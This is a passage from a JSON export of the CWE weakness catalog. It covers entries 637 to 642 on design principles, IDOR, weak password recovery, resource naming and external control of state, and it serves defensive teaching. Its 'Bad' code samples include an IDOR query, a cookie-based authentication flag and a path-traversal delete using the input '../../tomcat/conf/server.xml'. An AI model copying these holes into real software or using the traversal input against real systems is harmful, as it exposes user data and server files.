      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-522",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Failing Securely",
          "PublicationYear": "2005",
          "PublicationMonth": "12",
          "PublicationDay": "05",
          "URL": "https://web.archive.org/web/20221017053210/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/failing-securely",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Since design issues are hard to fix, they are rarely publicly reported, so there are few CVE examples of this problem as of January 2008. Most publicly reported issues occur as the result of an implementation error instead of design, such as CVE-2005-3177 (Improper handling of large numbers of resources) or CVE-2005-2969 (inadvertently disabling a verification step, leading to selection of a weaker protocol)."
        }
      ]
    },
    {
      "ID": "637",
      "Name": "Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism')",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.",
      "ExtendedDescription": "Security mechanisms should be as simple as possible. Complex security mechanisms may engender partial implementations and compatibility problems, with resulting mismatches in assumptions and implemented security. A corollary of this principle is that data specifications should be as simple as possible, because complex data specifications result in complex validation code. Complex tasks and systems may also need to be guarded by complex security checks, so simple systems should be preferred.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Unnecessary Complexity"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Avoid complex security mechanisms when simpler ones would meet requirements. Avoid complex data models, and unnecessarily complex operations. Adopt architectures that provide guarantees, simplify understanding through elegance and abstraction, and that can be implemented similarly. Modularize, isolate and do not trust complex code, and apply other secure programming principles on these modules (e.g., least privilege) to mitigate vulnerabilities."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-165",
          "Entries": [
            {
              "IntroText": "The IPSEC specification is complex, which resulted in bugs, partial implementations, and incompatibilities between vendors."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "HTTP Request Smuggling (CWE-444) attacks are feasible because there are not stringent requirements for how illegal or inconsistent HTTP headers should be handled. This can lead to inconsistent implementations in which a proxy or firewall interprets the same data stream as a different set of requests than the end points in that stream."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-6067",
          "Description": "Support for complex regular expressions leads to a resultant algorithmic complexity weakness (CWE-407).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6067"
        },
        {
          "Reference": "CVE-2007-1552",
          "Description": "Either a filename extension and a Content-Type header could be used to infer the file type, but the developer only checks the Content-Type, enabling unrestricted file upload (CWE-434).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1552"
        },
        {
          "Reference": "CVE-2007-6479",
          "Description": "In Apache environments, a \"filename.php.gif\" can be redirected to the PHP interpreter instead of being sent as an image/gif directly to the user. Not knowing this, the developer only checks the last extension of a submitted filename, enabling arbitrary code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6479"
        },
        {
          "Reference": "CVE-2005-2148",
          "Description": "The developer cleanses the $_REQUEST superglobal array, but PHP also populates $_GET, allowing attackers to bypass the protection mechanism and conduct SQL injection attacks against code that uses $_GET.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2148"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-524",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Economy of Mechanism",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "13",
          "URL": "https://web.archive.org/web/20220126060058/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/economy-of-mechanism",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "638",
      "Name": "Not Using Complete Mediation",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "862",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Execute Unauthorized Code or Commands",
            "Bypass Protection Mechanism",
            "Read Application Data",
            "Other"
          ],
          "Note": "A user might retain access to a critical resource even after privileges have been revoked, possibly allowing access to privileged functionality or sensitive information, depending on the role of the resource."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Invalidate cached privileges, file handles or descriptors, or other access credentials whenever identities, processes, policies, roles, capabilities or permissions change. Perform complete authentication checks before accepting, caching and reusing data, dynamic content and code (scripts). Avoid caching access control decisions as much as possible."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Identify all possible code paths that might access sensitive resources. If possible, create and use a single interface that performs the access checks, and develop code standards that require use of this interface."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-166",
          "Entries": [
            {
              "IntroText": "When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file (CWE-425), an attacker can bypass this access check."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "When a developer begins to implement input validation for a web application, often the validation is performed in each area of the code that uses externally-controlled input. In complex applications with many inputs, the developer often misses a parameter here or a cookie there. One frequently-applied solution is to centralize all input validation, store these validated inputs in a separate data structure, and require that all access of those inputs must be through that data structure. An alternate approach would be to use an external input validation framework such as Struts, which performs the validation before the inputs are ever processed by the code."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0408",
          "Description": "Server does not properly validate client certificates when reusing cached connections.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0408"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP20",
          "EntryName": "Race Condition Window"
        }
      ],
      "RelatedAttackPatterns": [
        "104"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-526",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Complete Mediation",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "12",
          "URL": "https://web.archive.org/web/20221006191503/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/complete-mediation",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "639",
      "Name": "Authorization Bypass Through User-Controlled Key",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.",
      "ExtendedDescription": "\n\nRetrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.\n\n\nFor example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.\n\n\nOne manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "284",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Insecure Direct Object Reference / IDOR",
          "Description": "The \"Insecure Direct Object Reference\" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference."
        },
        {
          "Term": "Broken Object Level Authorization / BOLA",
          "Description": "BOLA is used in the 2019 OWASP API Security Top 10 and is said to be the same as IDOR."
        },
        {
          "Term": "Horizontal Authorization",
          "Description": "\"Horizontal Authorization\" is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to resources in a multi-user context."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "Access control checks for specific user data or functionality can be bypassed."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "Horizontal escalation of privilege is possible (one user can view/modify information of another user)."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-195",
          "Entries": [
            {
              "IntroText": "The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\t...\n\t conn = new SqlConnection(_ConnectionString);\n\t conn.Open();\n\t int16 id = System.Convert.ToInt16(invoiceID.Text);\n\t SqlCommand query = new SqlCommand( \"SELECT * FROM invoices WHERE id = @id\", conn);\n\t query.Parameters.AddWithValue(\"@id\", id);\n\t SqlDataReader objReader = objCommand.ExecuteReader();\n\t ... \n```"
            },
            {
              "BodyText": "The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-36539",
          "Description": "An educational application does not appropriately restrict file IDs to a particular user. The attacker can brute-force guess IDs, indicating IDOR.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-36539"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "640",
      "Name": "Weak Password Recovery Mechanism for Forgotten Password",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.",
      "ExtendedDescription": "\n\nIt is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.\n\n\nThis weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "287",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users."
        },
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "The system's security functionality is turned against the system by the attacker."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not use standard weak security questions and use several security questions."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Assign a new temporary password rather than revealing the original password."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "49",
          "EntryName": "Insufficient Password Recovery"
        }
      ],
      "RelatedAttackPatterns": [
        "50"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 19: Use of Weak Password-Based Systems.\" Page 279",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This entry appears to be frequently misused for any weakness related to password changes, even though the name focuses on \"Password Recovery\" for a \"forgotten\" password.",
        "Comments": "CWE-640 should only be used when there is a \"password recovery\" mechanism for forgotten passwords. Consider password-related entries under CWE-1390: Weak Authentication.",
        "Reasons": [
          "Frequent Misuse"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry might be reclassified as a category or \"loose composite,\" since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password)."
        },
        {
          "Type": "Maintenance",
          "Note": "This entry probably needs to be split; see extended description."
        }
      ]
    },
    {
      "ID": "641",
      "Name": "Improper Restriction of Names for Files and Other Resources",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.",
      "ExtendedDescription": "This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "99",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "Execution of arbitrary code in the context of usage of the resources with dangerous names."
        },
        {
          "Scope": [
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Read Application Data",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Crash of the consumer code of these resources resulting in information leakage or denial of service."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not allow users to control names of resources used on the server side."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Perform allowlist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "642",
      "Name": "External Control of Critical State Data",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product stores security-critical state information about its users, or the product itself, in a location that is accessible to unauthorized actors.",
      "ExtendedDescription": "\n\nIf an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.\n\n\nState information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an \"authenticated=true\" cookie. An attacker may simply create this cookie in order to bypass the authentication.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The state variables may contain sensitive information that should not be known by the client."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "By modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked."
        },
        {
          "MitigationID": "MIT-14",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nStore state information and sensitive data on the server side only.\n\n\nEnsure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.\n\n\nIf information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions."
        },
        {
          "MitigationID": "MIT-4",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nWith a stateless protocol such as HTTP, use some frameworks can maintain the state for you.\n\n\nExamples include ASP.NET View State and the OWASP ESAPI Session Management feature.\n\n\nBe careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.\n"
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
        {
          "MitigationID": "MIT-16",
          "Phase": [
            "Operation",
            "Implementation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {\n\t\t\tauthenticated = true;\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-65",
          "Entries": [
            {
              "IntroText": "The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files (CWE-22)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString rName = request.getParameter(\"reportName\");\n\tFile rFile = new File(\"/usr/local/apfr/reports/\" + rName);\n\t...\n\trFile.delete();\n```"
            }
          ]
        },
        {
          "ID": "DX-66",
          "Entries": [
            {
              "IntroText": "The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tfis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\");\n\tamt = fis.read(arr);\n\tout.println(arr);\n```"
            }
          ]
        },
        {
          "ID": "DX-67",
          "Entries": [
            {
              "IntroText": "This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define DIR \"/restricted/directory\"\n\tchar cmd[500];\n\tsprintf(cmd, \"ls -l %480s\", DIR);\n```\n/* Raise privileges to those needed for accessing DIR. */* \n\t\n\tRaisePrivileges(...);\n\tsystem(cmd);\n\tDropPrivileges(...);\n\t..."
            },
            {
